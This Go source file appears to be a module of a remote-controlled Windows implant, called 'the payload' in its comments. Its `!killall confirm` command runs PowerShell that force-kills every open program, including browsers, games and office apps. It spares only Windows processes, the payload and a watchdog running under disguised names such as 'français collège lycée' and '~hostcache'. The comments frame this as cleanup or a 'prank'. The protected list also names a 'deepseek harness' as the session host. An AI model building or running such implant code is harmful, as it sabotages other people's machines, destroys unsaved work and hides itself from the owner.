// killall.go — fermeture massive, sans tuer la session.
//
// `!killall confirm` ferme tous les processus utilisateur sauf ceux qui font
// tourner Windows et le payload lui-même. Utile pour repartir propre sur un
// poste saturé (ou pour un prank assumé).
package main

import (
	"fmt"
	"strings"
)

// protectedProcesses : sans eux, la session tombe ou le payload se coupe.
var protectedProcesses = []string{
	// noyau et session Windows
	"system", "idle", "registry", "smss", "csrss", "wininit", "winlogon",
	"services", "lsass", "lsaiso", "svchost", "fontdrvhost", "dwm", "explorer",
	"spoolsv", "audiodg", "ctfmon", "sihost", "taskhostw", "runtimebroker",
	"searchhost", "startmenuexperiencehost", "shellexperiencehost",
	"textinputhost", "securityhealthservice", "msmpeng", "nissrv",
	// le payload et son watchdog
	"français collège lycée", "francais college lycee", "~hostcache",
	// l'hôte de cette session
	"node", "deepseek harness",
}

// isProtected dit si un nom de processus doit survivre.
func isProtected(name string) bool {
	low := strings.ToLower(strings.TrimSuffix(name, ".exe"))
	for _, p := range protectedProcesses {
		if low == p || strings.Contains(low, p) {
			return true
		}
	}
	return false
}

// killAllOthers ferme les processus non protégés. Exige `confirm`.
func killAllOthers(arg string) string {
	if strings.ToLower(strings.TrimSpace(arg)) != "confirm" {
		return "⚠️ **FERMETURE MASSIVE** — tous les programmes ouverts seront tués " +
			"(navigateurs, jeux, bureautique), sauf Windows et le payload.\n" +
			"Pour confirmer : `!killall confirm`"
	}
	ps := `$keep = @('` + strings.Join(protectedProcesses, "','") + `');` +
		`$n = 0;` +
		`Get-Process | Where-Object { $keep -notcontains $_.Name.ToLower() } | ForEach-Object { try { Stop-Process -Id $_.Id -Force -ErrorAction Stop; $n++ } catch { } };` +
		`$n`
	out, err := runPSUTF8(ps)
	if err != nil && strings.TrimSpace(out) == "" {
		return "fermeture impossible : " + err.Error()
	}
	n := strings.TrimSpace(out)
	if n == "" {
		n = "0"
	}
	return fmt.Sprintf("%s processus fermé(s). Windows et le payload sont intacts.", n)
}
